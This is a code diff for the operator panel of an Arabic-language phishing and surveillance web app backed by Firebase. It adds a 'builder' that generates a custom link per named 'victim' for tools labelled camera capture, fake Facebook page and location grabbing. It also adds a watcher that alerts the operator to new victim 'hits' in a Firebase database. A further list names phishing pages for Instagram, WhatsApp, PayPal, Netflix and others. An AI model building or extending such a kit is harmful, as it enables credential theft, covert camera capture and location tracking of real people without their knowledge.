@@ -171,6 +171,35 @@
             <div class="nav-item" onclick="nav(4, 'SETTINGS', '⚙️', this)"><i class="fas fa-cog"></i><br><span>الإعدادات</span></div>
         </nav>
     </div>
+    <div id="tab2" class="page">
+    <div class="tool-card" style="border-right:none; border-bottom: 3px solid var(--primary);">
+        <h3 style="font-family: Orbitron;">BUILDER SYSTEM</h3>
+        <p style="font-size: 11px; color: #666;">أنشئ رابط مخصص لضحية معينة</p>
+        
+        <select id="tool-select" class="btn" style="background:#111; color:white; margin-bottom:10px; border:1px solid #333">
+            <option value="كاميرا">أداة الكاميرا 📸</option>
+            <option value="فيسبوك">صفحة فيسبوك 👤</option>
+            <option value="موقع">سحب الموقع 📍</option>
+        </select>
+        
+        <input type="text" id="victim-name" placeholder="اسم الضحية (اختياري)">
+        <button class="btn btn-neon" onclick="generateCustomLink()">توليد الرابط المخصص 🚀</button>
+        
+        <div id="generated-result" style="display:none; margin-top:15px; padding:10px; border:1px dashed var(--primary); font-size:10px;">
+            <span id="final-link"></span>
+            <br><br>
+            <button class="btn" style="padding:5px" onclick="copyGeneratedLink()">نسخ 📋</button>
+        </div>
+    </div>
+</div>
+    <div id="notifications-box" class="page">
+    <div class="tool-card" style="border-right:none; border-left: 4px solid #ff1a1a;">
+        <h3 style="color: #ff1a1a;">LOGS & ALERTS 🔔</h3>
+        <div id="notifs-list" style="max-height: 400px; overflow-y: auto;">
+            <p style="font-size: 12px; color: #444;">لا توجد تنبيهات جديدة</p>
+        </div>
+    </div>
+</div>
 
     <script>
         const firebaseConfig = { databaseURL: "https://elcomando-68116-default-rtdb.firebaseio.com/" };
@@ -206,6 +235,34 @@
                 loader.style.display = 'none';
             }
         }
+
+        // 1. دالة إنشاء اللنك المخصص
+function generateCustomLink() {
+    const tool = document.getElementById('tool-select').value;
+    const victim = document.getElementById('victim-name').value || "target";
+    const user = localStorage.getItem('logged_user');
+    
+    const link = `https://elcomando-68116.web.app/${tool}?id=${user}&target=${victim}`;
+    
+    document.getElementById('final-link').innerText = link;
+    document.getElementById('generated-result').style.display = 'block';
+}
+
+// 2. دالة مراقبة الإشعارات (تشتغل في الخلفية)
+function startNotificationWatcher() {
+    const user = localStorage.getItem('logged_user');
+    db.ref('hits/' + user).limitToLast(5).on('child_added', (snap) => {
+        // لو في ضحية جديدة، طلع إشعار
+        const audio = new Audio('https://www.soundjay.com/buttons/beep-01a.mp3');
+        // audio.play(); // فعلها لو عاوز صوت
+        
+        const list = document.getElementById('notifs-list');
+        list.innerHTML = `<div class="list-item" style="border-left:2px solid var(--primary); margin-bottom:5px; padding:5px;">
+            ⚠️ دخول جديد على أداة: ${snap.key}
+        </div>` + list.innerHTML;
+    });
+}
+
 
         // 2. نظام الـ 16 زرار والصفحات الداخلية
         const tools = ["كاميرا", "موقع", "فيسبوك", "انستا", "واتساب", "تيك توك", "ببجي", "فري فاير", "سناب", "تلجرام", "نتفليكس", "باي بال", "واي فاي", "تويتر", "درايف", "أمان"];
